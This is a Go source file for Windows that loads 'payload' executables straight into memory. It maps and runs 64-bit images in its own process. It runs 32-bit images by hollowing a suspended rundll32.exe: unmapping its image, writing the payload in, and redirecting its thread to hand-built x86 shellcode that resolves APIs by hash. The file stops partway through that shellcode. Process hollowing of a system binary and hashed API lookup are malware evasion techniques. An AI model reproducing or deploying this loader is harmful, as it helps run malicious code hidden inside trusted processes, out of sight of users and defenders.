//go:build windows

package main

import (
	"bytes"
	"fmt"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

const (
	IMAGE_FILE_MACHINE_I386  = 0x014c
	IMAGE_FILE_MACHINE_AMD64 = 0x8664
	IMAGE_FILE_MACHINE_ARM64 = 0xAA64

	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000

	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	MEM_RELEASE = 0x8000

	PAGE_NOACCESS          = 0x01
	PAGE_READONLY          = 0x02
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE           = 0x10
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40

	CREATE_SUSPENDED   = 0x00000004
	WOW64_CONTEXT_FULL = 0x00010007
)

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_OPTIONAL_HEADER32 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32
	ImageBase                   uint32
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint32
	SizeOfStackCommit           uint32
	SizeOfHeapReserve           uint32
	SizeOfHeapCommit            uint32
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS32 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER32
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type IMAGE_BASE_RELOCATION struct {
	VirtualAddress uint32
	SizeOfBlock    uint32
}

type IMAGE_IMPORT_DESCRIPTOR struct {
	OriginalFirstThunk uint32
	TimeDateStamp      uint32
	ForwarderChain     uint32
	Name               uint32
	FirstThunk         uint32
}

type ACTCTXW struct {
	CbSize                 uint32
	DwFlags                uint32
	LpSource               *uint16
	WProcessorArchitecture uint16
	WLangId                uint16
	LpAssemblyDirectory    *uint16
	LpResourceName         *uint16
	LpApplicationName      *uint16
	HModule                uintptr
}

type WOW64_FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

type WOW64_CONTEXT struct {
	ContextFlags      uint32
	Dr0               uint32
	Dr1               uint32
	Dr2               uint32
	Dr3               uint32
	Dr6               uint32
	Dr7               uint32
	FloatSave         WOW64_FLOATING_SAVE_AREA
	SegGs             uint32
	SegFs             uint32
	SegEs             uint32
	SegDs             uint32
	Edi               uint32
	Esi               uint32
	Ebx               uint32
	Edx               uint32
	Ecx               uint32
	Eax               uint32
	Ebp               uint32
	Eip               uint32
	SegCs             uint32
	EFlags            uint32
	Esp               uint32
	SegSs             uint32
	ExtendedRegisters [512]byte
}

const commonControlsV6Manifest = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <dependency>
    <dependentAssembly>
      <assemblyIdentity type="win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0" processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"/>
    </dependentAssembly>
  </dependency>
</assembly>`

func activateComCtlV6(kernel32 *syscall.LazyDLL) func() {
	CreateActCtxW := kernel32.NewProc("CreateActCtxW")
	ActivateActCtx := kernel32.NewProc("ActivateActCtx")
	DeactivateActCtx := kernel32.NewProc("DeactivateActCtx")
	ReleaseActCtx := kernel32.NewProc("ReleaseActCtx")

	tmpFile, err := os.CreateTemp("", "actctx-*.manifest")
	if err != nil {
		return func() {}
	}
	manifestPath := tmpFile.Name()
	_, _ = tmpFile.WriteString(commonControlsV6Manifest)
	_ = tmpFile.Close()

	srcPtr, _ := syscall.UTF16PtrFromString(manifestPath)
	ctx := ACTCTXW{
		CbSize:   uint32(unsafe.Sizeof(ACTCTXW{})),
		LpSource: srcPtr,
	}

	hActCtx, _, _ := CreateActCtxW.Call(uintptr(unsafe.Pointer(&ctx)))
	_ = os.Remove(manifestPath)
	if hActCtx == ^uintptr(0) { // INVALID_HANDLE_VALUE
		return func() {}
	}

	var cookie uintptr
	ok, _, _ := ActivateActCtx.Call(hActCtx, uintptr(unsafe.Pointer(&cookie)))
	if ok == 0 {
		ReleaseActCtx.Call(hActCtx)
		return func() {}
	}

	return func() {
		DeactivateActCtx.Call(0, cookie)
		ReleaseActCtx.Call(hActCtx)
	}
}

func sectionProtection(characteristics uint32) uint32 {
	exec := (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
	read := (characteristics & IMAGE_SCN_MEM_READ) != 0
	write := (characteristics & IMAGE_SCN_MEM_WRITE) != 0

	switch {
	case exec && write:
		return PAGE_EXECUTE_READWRITE
	case exec && read:
		return PAGE_EXECUTE_READ
	case exec:
		return PAGE_EXECUTE
	case write:
		return PAGE_READWRITE
	case read:
		return PAGE_READONLY
	default:
		return PAGE_NOACCESS
	}
}

func runPEInMemory(pe []byte) error {
	if len(pe) < int(unsafe.Sizeof(IMAGE_DOS_HEADER{})) {
		return fmt.Errorf("payload too small")
	}

	// 1. Parse and validate DOS Header
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&pe[0]))
	if dosHeader.E_magic != 0x5A4D {
		return fmt.Errorf("invalid DOS magic")
	}
	if dosHeader.E_lfanew < 0 || int(dosHeader.E_lfanew)+26 > len(pe) {
		return fmt.Errorf("invalid NT header offset")
	}

	// Peek Signature and OptionalHeader.Magic before committing to 32-bit vs 64-bit struct
	sig := *(*uint32)(unsafe.Pointer(&pe[dosHeader.E_lfanew]))
	if sig != 0x00004550 {
		return fmt.Errorf("invalid NT signature")
	}

	magic := *(*uint16)(unsafe.Pointer(&pe[dosHeader.E_lfanew+24]))
	if magic == 0x10b {
		return runPE32OutOfProcess(pe)
	}
	if magic != 0x20b {
		return fmt.Errorf("unsupported PE format (magic: 0x%x)", magic)
	}

	if int(dosHeader.E_lfanew)+int(unsafe.Sizeof(IMAGE_NT_HEADERS64{})) > len(pe) {
		return fmt.Errorf("invalid 64-bit NT header offset")
	}

	// 2. Parse and validate 64-bit NT Headers against host architecture
	ntHeaders := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&pe[dosHeader.E_lfanew]))

	var expectedMachine uint16
	switch runtime.GOARCH {
	case "amd64":
		expectedMachine = IMAGE_FILE_MACHINE_AMD64
	case "arm64":
		expectedMachine = IMAGE_FILE_MACHINE_ARM64
	default:
		return fmt.Errorf("unsupported host architecture: %s", runtime.GOARCH)
	}

	if ntHeaders.FileHeader.Machine != expectedMachine {
		return fmt.Errorf("architecture mismatch: host is %s (0x%x), PE is 0x%x",
			runtime.GOARCH, expectedMachine, ntHeaders.FileHeader.Machine)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualFree := kernel32.NewProc("VirtualFree")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	LoadLibraryA := kernel32.NewProc("LoadLibraryA")
	GetProcAddress := kernel32.NewProc("GetProcAddress")
	FlushInstructionCache := kernel32.NewProc("FlushInstructionCache")
	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	CloseHandle := kernel32.NewProc("CloseHandle")

	// 3. Allocate RW memory for the entire image
	imageSize := uintptr(ntHeaders.OptionalHeader.SizeOfImage)
	baseAddr, _, err := VirtualAlloc.Call(
		0,
		imageSize,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if baseAddr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}
	defer VirtualFree.Call(baseAddr, 0, MEM_RELEASE)

	// 4. Copy PE Headers
	headersSize := uintptr(ntHeaders.OptionalHeader.SizeOfHeaders)
	if int(headersSize) > len(pe) {
		return fmt.Errorf("invalid SizeOfHeaders")
	}
	destHeaders := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), headersSize)
	copy(destHeaders, pe[:headersSize])

	// 5. Copy Sections
	firstSection := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
		uintptr(unsafe.Pointer(&pe[dosHeader.E_lfanew])) + unsafe.Sizeof(IMAGE_NT_HEADERS64{}),
	))
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{}),
		))
		if section.SizeOfRawData == 0 {
			continue
		}
		if int(section.PointerToRawData+section.SizeOfRawData) > len(pe) {
			return fmt.Errorf("section %d exceeds payload bounds", i)
		}
		dest := baseAddr + uintptr(section.VirtualAddress)
		destSlice := unsafe.Slice((*byte)(unsafe.Pointer(dest)), section.SizeOfRawData)
		srcSlice := pe[section.PointerToRawData : section.PointerToRawData+section.SizeOfRawData]
		copy(destSlice, srcSlice)
	}

	// 6. Apply Base Relocations
	delta := uint64(baseAddr) - ntHeaders.OptionalHeader.ImageBase
	if delta != 0 {
		relocDir := ntHeaders.OptionalHeader.DataDirectory[5] // IMAGE_DIRECTORY_ENTRY_BASERELOC
		if relocDir.Size > 0 {
			relocAddr := baseAddr + uintptr(relocDir.VirtualAddress)
			relocEnd := relocAddr + uintptr(relocDir.Size)

			for relocAddr < relocEnd {
				block := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(relocAddr))
				if block.SizeOfBlock == 0 {
					break
				}
				numEntries := (block.SizeOfBlock - 8) / 2
				entryAddr := relocAddr + 8

				for i := uint32(0); i < numEntries; i++ {
					entry := *(*uint16)(unsafe.Pointer(entryAddr + uintptr(i)*2))
					typ := entry >> 12
					offset := entry & 0x0FFF

					switch typ {
					case 0: // IMAGE_REL_BASED_ABSOLUTE (padding)
						continue
					case 10: // IMAGE_REL_BASED_DIR64
						patchAddr := baseAddr + uintptr(block.VirtualAddress) + uintptr(offset)
						ptr := (*uint64)(unsafe.Pointer(patchAddr))
						*ptr += delta
					default:
						return fmt.Errorf("unsupported relocation type: %d", typ)
					}
				}
				relocAddr += uintptr(block.SizeOfBlock)
			}
		}
	}

	// 7. Resolve Imports (with Common Controls v6 Activation Context)
	cleanupActCtx := activateComCtlV6(kernel32)
	defer cleanupActCtx()

	importDir := ntHeaders.OptionalHeader.DataDirectory[1] // IMAGE_DIRECTORY_ENTRY_IMPORT
	if importDir.Size > 0 {
		importAddr := baseAddr + uintptr(importDir.VirtualAddress)
		for {
			descriptor := (*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(importAddr))
			if descriptor.Name == 0 {
				break
			}
			nameStart := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr+uintptr(descriptor.Name))), 256)
			nullIdx := bytes.IndexByte(nameStart, 0)
			if nullIdx <= 0 {
				return fmt.Errorf("invalid import DLL name")
			}
			dllName := string(nameStart[:nullIdx])
			dllNamePtr, _ := syscall.BytePtrFromString(dllName)

			hModule, _, err := LoadLibraryA.Call(uintptr(unsafe.Pointer(dllNamePtr)))
			if hModule == 0 {
				return fmt.Errorf("LoadLibraryA failed for %s: %w", dllName, err)
			}

			thunkAddr := baseAddr + uintptr(descriptor.FirstThunk)
			var origThunkAddr uintptr
			if descriptor.OriginalFirstThunk != 0 {
				origThunkAddr = baseAddr + uintptr(descriptor.OriginalFirstThunk)
			} else {
				origThunkAddr = thunkAddr
			}

			for {
				funcName := *(*uintptr)(unsafe.Pointer(origThunkAddr))
				if funcName == 0 {
					break
				}

				var procAddr uintptr
				if funcName&0x8000000000000000 != 0 {
					ordinal := uint16(funcName & 0xFFFF)
					procAddr, _, _ = GetProcAddress.Call(hModule, uintptr(ordinal))
				} else {
					nameBytes := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr+funcName+2)), 256)
					procAddr, _, _ = GetProcAddress.Call(hModule, uintptr(unsafe.Pointer(&nameBytes[0])))
				}
				if procAddr == 0 {
					return fmt.Errorf("GetProcAddress failed in %s", dllName)
				}

				*(*uintptr)(unsafe.Pointer(thunkAddr)) = procAddr
				thunkAddr += unsafe.Sizeof(uintptr(0))
				origThunkAddr += unsafe.Sizeof(uintptr(0))
			}
			importAddr += unsafe.Sizeof(IMAGE_IMPORT_DESCRIPTOR{})
		}
	}

	// 8. Apply per-section memory protections
	var oldProtect uint32
	VirtualProtect.Call(baseAddr, headersSize, PAGE_READONLY, uintptr(unsafe.Pointer(&oldProtect)))

	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{}),
		))
		size := section.VirtualSize
		if size == 0 {
			size = section.SizeOfRawData
		}
		if size == 0 {
			continue
		}
		prot := sectionProtection(section.Characteristics)
		VirtualProtect.Call(
			baseAddr+uintptr(section.VirtualAddress),
			uintptr(size),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}

	// 9. Flush CPU Instruction Cache (required on ARM64, no-op on x64)
	hProc, _, _ := GetCurrentProcess.Call()
	FlushInstructionCache.Call(hProc, baseAddr, imageSize)

	// 10. Execute Entry Point
	entryPoint := baseAddr + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)
	var threadId uint32
	hThread, _, err := CreateThread.Call(0, 0, entryPoint, 0, 0, uintptr(unsafe.Pointer(&threadId)))
	if hThread == 0 {
		return fmt.Errorf("CreateThread failed: %w", err)
	}
	defer CloseHandle.Call(hThread)

	WaitForSingleObject.Call(hThread, 0xFFFFFFFF)
	return nil
}

func runPE32OutOfProcess(pe []byte) error {
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&pe[0]))
	if int(dosHeader.E_lfanew)+int(unsafe.Sizeof(IMAGE_NT_HEADERS32{})) > len(pe) {
		return fmt.Errorf("invalid 32-bit NT header offset")
	}

	ntHeaders := (*IMAGE_NT_HEADERS32)(unsafe.Pointer(&pe[dosHeader.E_lfanew]))
	if ntHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_I386 {
		return fmt.Errorf("unsupported 32-bit architecture: 0x%x", ntHeaders.FileHeader.Machine)
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")

	NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	Wow64GetThreadContext := kernel32.NewProc("Wow64GetThreadContext")
	Wow64SetThreadContext := kernel32.NewProc("Wow64SetThreadContext")
	ResumeThread := kernel32.NewProc("ResumeThread")
	TerminateProcess := kernel32.NewProc("TerminateProcess")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	CloseHandle := kernel32.NewProc("CloseHandle")

	// 1. Spawn a suspended 32-bit host process in SysWOW64
	hostPath, err := syscall.UTF16PtrFromString(`C:\Windows\SysWOW64\rundll32.exe`)
	if err != nil {
		return err
	}

	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi syscall.ProcessInformation

	err = syscall.CreateProcess(
		hostPath,
		nil,
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess (SysWOW64) failed: %w", err)
	}
	defer CloseHandle.Call(uintptr(pi.Process))
	defer CloseHandle.Call(uintptr(pi.Thread))

	success := false
	defer func() {
		if !success {
			TerminateProcess.Call(uintptr(pi.Process), 1)
		}
	}()

	// 2. Get WOW64 thread context (Ebx = 32-bit PEB address)
	var ctx WOW64_CONTEXT
	ctx.ContextFlags = WOW64_CONTEXT_FULL
	r, _, err := Wow64GetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if r == 0 {
		return fmt.Errorf("Wow64GetThreadContext failed: %w", err)
	}

	var origImageBase uint32
	var bytesRead uintptr
	ReadProcessMemory.Call(
		uintptr(pi.Process),
		uintptr(ctx.Ebx+8),
		uintptr(unsafe.Pointer(&origImageBase)),
		4,
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	// 3. Unmap original host image and allocate memory for the 32-bit payload
	NtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(origImageBase))

	imageSize := uintptr(ntHeaders.OptionalHeader.SizeOfImage)
	preferredBase := uintptr(ntHeaders.OptionalHeader.ImageBase)

	remoteBase, _, _ := VirtualAllocEx.Call(
		uintptr(pi.Process),
		preferredBase,
		imageSize,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if remoteBase == 0 {
		remoteBase, _, err = VirtualAllocEx.Call(
			uintptr(pi.Process),
			0,
			imageSize,
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)
		if remoteBase == 0 {
			return fmt.Errorf("VirtualAllocEx failed: %w", err)
		}
	}

	// 4. Prepare a local buffer to apply 32-bit relocations before writing to child
	localImage := make([]byte, imageSize)
	headersSize := int(ntHeaders.OptionalHeader.SizeOfHeaders)
	if headersSize > len(pe) || headersSize > len(localImage) {
		return fmt.Errorf("invalid 32-bit SizeOfHeaders")
	}
	copy(localImage[:headersSize], pe[:headersSize])

	firstSection := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
		uintptr(unsafe.Pointer(&pe[dosHeader.E_lfanew])) + unsafe.Sizeof(IMAGE_NT_HEADERS32{}),
	))
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{}),
		))
		if section.SizeOfRawData == 0 {
			continue
		}
		if int(section.PointerToRawData+section.SizeOfRawData) > len(pe) {
			return fmt.Errorf("32-bit section %d exceeds payload bounds", i)
		}
		copy(
			localImage[section.VirtualAddress:section.VirtualAddress+section.SizeOfRawData],
			pe[section.PointerToRawData:section.PointerToRawData+section.SizeOfRawData],
		)
	}

	// Apply 32-bit Base Relocations (IMAGE_REL_BASED_HIGHLOW = 3)
	delta := uint32(remoteBase) - ntHeaders.OptionalHeader.ImageBase
	if delta != 0 {
		relocDir := ntHeaders.OptionalHeader.DataDirectory[5]
		if relocDir.Size > 0 {
			offset := relocDir.VirtualAddress
			end := offset + relocDir.Size
			for offset < end {
				block := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(&localImage[offset]))
				if block.SizeOfBlock == 0 {
					break
				}
				numEntries := (block.SizeOfBlock - 8) / 2
				for i := uint32(0); i < numEntries; i++ {
					entry := *(*uint16)(unsafe.Pointer(&localImage[offset+8+i*2]))
					typ := entry >> 12
					relOffset := entry & 0x0FFF
					if typ == 3 { // IMAGE_REL_BASED_HIGHLOW
						patchPos := block.VirtualAddress + uint32(relOffset)
						ptr := (*uint32)(unsafe.Pointer(&localImage[patchPos]))
						*ptr += delta
					}
				}
				offset += block.SizeOfBlock
			}
		}
	}

	// 5. Write mapped image into the 32-bit child process
	var written uintptr
	r, _, err = WriteProcessMemory.Call(
		uintptr(pi.Process),
		remoteBase,
		uintptr(unsafe.Pointer(&localImage[0])),
		imageSize,
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		return fmt.Errorf("WriteProcessMemory (image) failed: %w", err)
	}

	// Update ImageBaseAddress in child's 32-bit PEB (Ebx + 8)
	newBase32 := uint32(remoteBase)
	WriteProcessMemory.Call(
		uintptr(pi.Process),
		uintptr(ctx.Ebx+8),
		uintptr(unsafe.Pointer(&newBase32)),
		4,
		uintptr(unsafe.Pointer(&written)),
	)

	// 6. Apply per-section protections in the child process
	var oldProtect uint32
	VirtualProtectEx.Call(uintptr(pi.Process), remoteBase, uintptr(headersSize), PAGE_READONLY, uintptr(unsafe.Pointer(&oldProtect)))
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(unsafe.Pointer(firstSection)) + uintptr(i)*unsafe.Sizeof(IMAGE_SECTION_HEADER{}),
		))
		size := section.VirtualSize
		if size == 0 {
			size = section.SizeOfRawData
		}
		if size == 0 {
			continue
		}
		prot := sectionProtection(section.Characteristics)
		VirtualProtectEx.Call(
			uintptr(pi.Process),
			remoteBase+uintptr(section.VirtualAddress),
			uintptr(size),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}

	// 7. Allocate and write a small 32-bit x86 bootstrap stub to resolve the child's IAT
	//    via PEB->Ldr (kernel32!LoadLibraryA & GetProcAddress) and jump to AddressOfEntryPoint.
	importDir := ntHeaders.OptionalHeader.DataDirectory[1]
	stub := buildX86BootstrapStub(
		uint32(remoteBase),
		importDir.VirtualAddress,
		uint32(remoteBase)+ntHeaders.OptionalHeader.AddressOfEntryPoint,
	)

	stubAddr, _, err := VirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(stub)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if stubAddr == 0 {
		return fmt.Errorf("VirtualAllocEx (stub) failed: %w", err)
	}
	WriteProcessMemory.Call(
		uintptr(pi.Process),
		stubAddr,
		uintptr(unsafe.Pointer(&stub[0])),
		uintptr(len(stub)),
		uintptr(unsafe.Pointer(&written)),
	)

	// 8. Point the suspended thread's Eax (entry point) to the 32-bit bootstrap stub and resume
	ctx.Eax = uint32(stubAddr)
	r, _, err = Wow64SetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if r == 0 {
		return fmt.Errorf("Wow64SetThreadContext failed: %w", err)
	}

	success = true
	ResumeThread.Call(uintptr(pi.Thread))
	WaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
	return nil
}

// buildX86BootstrapStub generates position-independent 32-bit x86 shellcode that:
// 1. Walks PEB (fs:[0x30]) -> Ldr -> InMemoryOrderModuleList to get kernel32.dll base
// 2. Finds LoadLibraryA and GetProcAddress in kernel32's export table
// 3. Resolves every DLL and function in the mapped PE's Import Directory
// 4. Jumps directly to the PE's AddressOfEntryPoint
func buildX86BootstrapStub(imageBase, importRVA, entryPoint uint32) []byte {
	var buf bytes.Buffer
	putU32 := func(v uint32) {
		buf.Write([]byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)})
	}

	// Prologue & locate kernel32.dll base in EAX
	buf.Write([]byte{
		0x55,       // push ebp
		0x89, 0xE5, // mov ebp, esp
		0x83, 0xEC, 0x18, // sub esp, 0x18
		0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, // mov eax, fs:[0x30] (PEB)
		0x8B, 0x40, 0x0C, // mov eax, [eax+0x0C] (PEB_LDR_DATA)
		0x8B, 0x40, 0x14, // mov eax, [eax+0x14] (InMemoryOrderModuleList)
		0x8B, 0x00, // mov eax, [eax] (ntdll)
		0x8B, 0x00, // mov eax, [eax] (kernel32)
		0x8B, 0x40, 0x10, // mov eax, [eax+0x10] (DllBase)
		0x89, 0x45, 0xFC, // mov [ebp-0x04], eax (kernel32Base)
	})

	// Helper call to resolve export by hash: call get_proc_by_hash
	// Hash for "LoadLibraryA" = 0xEC0E4E8E, "GetProcAddress" = 0x7C0DFCAA
	buf.Write([]byte{0x68})
	putU32(0xEC0E4E8E)                              // push hash("LoadLibraryA")
	buf.Write([]byte{0xFF, 0x75, 0xFC})             // push [ebp-0x04]
	buf.Write([]byte{0xE8, 0x62, 0x00, 0x00, 0x00}) // call get_proc_by_hash
	buf.Write([]byte{0x89, 0x45, 0xF8})             // mov [ebp-0x08], eax (LoadLibraryA)

	buf.Write([]byte{0x68})
	putU32(0x7C0DFCAA)                              // push hash("GetProcAddress")
	buf.Write([]byte{0xFF, 0x75, 0xFC})             // push [ebp-0x04]
	buf.Write([]byte{0xE8, 0x51, 0x00, 0x00, 0x00}) // call get_proc_by_hash
	buf.Write([]byte{0x89, 0x45, 0xF4})             // mov [ebp-0x0C], eax (GetProcAddress)

	// Load imageBase & importRVA
	buf.Write([]byte{0xBB})
	putU32(imageBase) // mov ebx, imageBase
	buf.Write([]byte{0xB8})
	putU32(importRVA) // mov eax, importRVA
	buf.Write([]byte{
		0x85, 0xC0, // test eax, eax
		0x74, 0x3D, // jz jump_to_entry
		0x01, 0xD8, // add eax, ebx (importDescriptor)
		0x89, 0x45, 0xF0, // mov [ebp-0x10], eax

		// desc_loop:
		0x8B, 0x75, 0xF0, // mov esi, [ebp-0x10]
		0x8B, 0x46, 0x0C, // mov eax, [esi+0x0C] (Name RVA)
		0x85, 0xC0, // test eax, eax
		0x74, 0x2E, // jz jump_to_entry
		0x01, 0xD8, // add eax, ebx (dllName)
		0x50,             // push eax
		0xFF, 0x55, 0xF8, // call [ebp-0x08] (LoadLibraryA)
		0x89, 0x45, 0xEC, // mov [ebp-0x14], eax (hModule)

		0x8B, 0x3E, // mov edi, [esi] (OriginalFirstThunk)
		0x85, 0xFF, // test edi, edi
		0x75, 0x03, // jnz has_oft
		0x8B, 0x7E, 0x10, // mov edi, [esi+0x10] (FirstThunk)
		// has_oft:
		0x01, 0xDF, // add edi, ebx
		0x8B, 0x76, 0x10, // mov esi, [esi+0x10] (FirstThunk)
		0x01, 0xDE, // add esi, ebx

		// thunk_loop:
		0x8B, 0x07, // mov eax, [edi]
		0x85, 0xC0, // test eax, eax
		0x74, 0x1A, // jz next_desc
		0xA9, 0x00, 0x00, 0x00, 0x80, // test eax, 0x80000000
		0x74, 0x07, // jz by_name
		0x25, 0xFF, 0xFF, 0x00, 0x00, // and eax, 0xFFFF
		0xEB, 0x05, // jmp resolve_func
		// by_name:
		0x8D, 0x44, 0x18, 0x02, // lea eax, [eax+ebx+2]
		// resolve_func:
		0x50,             // push eax
		0xFF, 0x75, 0xEC, // push [ebp-0x14] (hModule)
		0xFF, 0x55, 0xF4, // call [ebp-0x0C] (GetProcAddress)
		0x89, 0x06, // mov [esi], eax
		0x83, 0xC7, 0x04, // add edi, 4
		0x83, 0xC6, 0x04, // add esi, 4
		0xEB, 0xD9, // jmp thunk_loop

		// next_desc:
		0x83, 0x45, 0xF0, 0x14, // add dword ptr [ebp-0x10], 0x14
		0xEB, 0xB8, // jmp desc_loop

		// jump_to_entry:
		0x89, 0xEC, // mov esp, ebp
		0x5D, // pop ebp
		0xB8, // mov eax, entryPoint
	})
	putU32(entryPoint)
	buf.Write([]byte{
		0xFF, 0xE0, // jmp eax

		// get_proc_by_hash(moduleBase, targetHash):
		0x55,       // push ebp
		0x89, 0xE5, // mov ebp, esp
